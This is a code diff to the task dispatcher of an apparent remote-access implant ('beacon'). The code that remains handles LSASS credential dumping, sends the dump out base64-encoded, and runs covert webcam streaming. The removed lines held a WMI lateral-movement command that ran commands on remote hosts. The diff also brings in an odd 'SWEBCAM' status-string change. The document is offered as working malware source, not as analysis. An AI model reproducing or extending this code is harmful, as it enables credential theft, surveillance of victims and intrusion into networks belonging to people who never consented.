@@ -17,13 +17,11 @@
 #include "../credential/LsassDumper.h"
 #include "../fs/FileSystem.h"
 #include "../recon/DeepRecon.h"
-#include "../modules/Lateral.h"
 #include "../crypto/Base64.h"
 #include "../utils/Logger.h"
 #include <stdexcept>
 #include <sstream>
 #include <filesystem>
-#include <algorithm>
 
 namespace beacon {
 
@@ -118,13 +116,11 @@ void TaskDispatcher::dispatch(const Task& task) {
             }
             case TaskType::WEBCAM_STREAM: {
                  std::string cmd = task.cmd;
-                if (cmd.rfind("start", 0) == 0) {
+                if (cmd.find("start") == 0) {
                     int duration = 0;
-                    try {
+                     try {
                         size_t space = cmd.find(' ');
-                        if (space != std::string::npos) {
-                            duration = std::stoi(cmd.substr(space + 1));
-                        }
+                        if (space != std::string::npos) duration = std::stoi(cmd.substr(space + 1));
                     } catch(...) {}
 
                     auto cb = [this](const std::string& tid, const std::string& out) {
@@ -132,10 +128,10 @@ void TaskDispatcher::dispatch(const Task& task) {
                          this->pendingResults_.enqueue(r);
                     };
                     streaming::StartWebcamStream(duration, task.task_id, cb);
-                    result.output = "WEBCAM_STREAM_STATUS:Webcam stream started";
+                    result.output = "SWEBCAM_STREAM_STATUS:Webcam stream started";
                 } else if (cmd == "stop") {
                     streaming::StopWebcamStream();
-                    result.output = "WEBCAM_STREAM_STATUS:Webcam stream stopped";
+                    result.output = "SWEBCAM_STREAM_STATUS:Webcam stream stopped";
                 }
                 break;
             }
@@ -263,28 +259,6 @@ void TaskDispatcher::dispatch(const Task& task) {
                 if (dump.empty()) result.error = "LSASS dump failed (admin/debug priv required)";
                 else {
                     result.output = "FILE_DOWNLOAD:lsass.dmp:" + crypto::Base64Encode(dump);
-                }
-                break;
-            }
-            case TaskType::GET_LOGS:
-                result.output = "LOGS:" + utils::Logger::GetRecentLogs(200);
-                break;
-            case TaskType::LATERAL_WMI: {
-                // Cmd format: "target:command"
-                size_t colon = task.cmd.find(':');
-                if (colon != std::string::npos) {
-                    std::string target_s = task.cmd.substr(0, colon);
-                    std::string cmd_s = task.cmd.substr(colon + 1);
-                    std::wstring target_ws(target_s.begin(), target_s.end());
-                    std::wstring cmd_ws(cmd_s.begin(), cmd_s.end());
-
-                    if (Lateral::WmiRemoteExec(target_ws, cmd_ws)) {
-                        result.output = "LATERAL_WMI:Successfully executed on " + target_s;
-                    } else {
-                        result.error = "LATERAL_WMI:Failed to execute on " + target_s;
-                    }
-                } else {
-                    result.error = "Invalid lateral_wmi command format (expected target:command)";
                 }
                 break;
             }
